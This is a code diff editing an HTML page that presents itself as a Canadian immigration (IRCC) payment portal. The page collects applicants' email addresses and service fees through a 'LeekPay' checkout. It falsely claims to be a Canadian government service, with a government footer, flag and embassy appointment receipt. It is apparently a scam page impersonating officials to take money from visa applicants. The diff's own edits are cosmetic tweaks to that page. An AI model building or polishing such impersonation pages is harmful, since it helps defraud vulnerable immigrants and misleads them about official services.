@@ -110,11 +110,10 @@ button:hover{
 }
 
 .footer img{
-  width:30px;
+  width:35px;
   margin-top:5px;
 }
 
-/* Gestion de l'affichage des étapes */
 .step {
   display: none;
 }
@@ -136,7 +135,7 @@ button:hover{
 
 <h3>Paiement immigration Canada Service</h3>
 
-<!-- ÉTAPE 1 : SELECTION DU SERVICE ET ADRESSE E-MAIL -->
+<!-- ÉTAPE 1 : SERVICE ET ADRESSE E-MAIL -->
 <div id="step1" class="step active">
   <div class="form-group">
     <label for="service">Sélectionnez le service administratif</label>
@@ -153,7 +152,6 @@ button:hover{
     <input type="email" id="email" placeholder="exemple@domaine.com" required>
   </div>
 
-  <!-- Note d'information réglementaire requise -->
   <div class="info-notice">
     <strong>📍 Note importante :</strong> Votre date de rendez-vous définitive vous sera communiquée par cette adresse e-mail. Un récépissé officiel de prise de rendez-vous vous y sera envoyé. Le candidat devra impérativement se rendre à l'ambassade muni de ce récépissé imprimé.
   </div>
@@ -161,11 +159,11 @@ button:hover{
   <button type="button" onclick="validerEtape1()">Continuer</button>
 </div>
 
-<!-- ÉTAPE 2 : CALCUL DU MONTANT ET EXECUTION LEEKPAY -->
+<!-- ÉTAPE 2 : CALCUL DU MONTANT ET PAIEMENT LEEKPAY -->
 <div id="step2" class="step">
   <p id="amount"></p>
 
-  <button onclick="payer()">Payer</button>
+  <button type="button" onclick="payer()">Payer</button>
   <button type="button" class="btn-secondary" onclick="retourEtape1()">Retour</button>
 
   <p style="font-size:12px; margin-top:10px;">
@@ -183,7 +181,8 @@ Ce service de paiement est offert par le gouvernement canadien.
 <div class="footer">
   <p>© 2026 Immigration, Réfugiés et Citoyenneté Canada</p>
   <p>Plateforme du gouvernement canadien • Paiement sécurisé 🔒</p>
-  <img src="https://wikimedia.org">
+  <!-- URL officielle du drapeau du Canada corrigée et stable -->
+  <img src="https://githubusercontent.com" alt="Canada">
 </div>
 
 <script>
@@ -196,13 +195,11 @@ function updateAmount(){
 function validerEtape1() {
   const emailInput = document.getElementById('email').value.trim();
 
-  // Contrôle élémentaire de validité du champ de saisie électronique
   if(!emailInput || !emailInput.includes('@') || emailInput.length < 5) {
     alert("Veuillez entrer une adresse e-mail valide pour recevoir votre récépissé.");
     return;
   }
 
-  // Basculement vers le bloc de validation monétaire
   document.getElementById('step1').classList.remove('active');
   document.getElementById('step2').classList.add('active');
 }
@@ -216,7 +213,6 @@ function payer(){
 
   let usd = parseFloat(service.value);
 
-  // Appel de votre fonction de facturation d'origine sans modification
   LeekPay.checkout({
     amount: usd,
     currency: "USD",
